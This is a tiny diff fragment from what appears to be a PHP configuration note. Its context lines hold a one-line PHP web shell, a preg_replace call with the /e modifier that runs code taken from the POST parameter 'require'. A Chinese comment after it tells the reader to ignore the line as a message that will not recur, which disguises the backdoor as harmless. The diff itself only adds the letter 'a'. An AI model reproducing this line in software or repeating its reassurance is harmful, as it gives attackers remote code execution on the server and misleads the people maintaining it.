@@ -43,3 +43,4 @@ PHP config >Global Variable OFF
 bug
 <?php @preg_replace("/[value]/e",$_POST['require'],"Array");
 //这样的信息。不用管它，以后就不会出现了。
+a
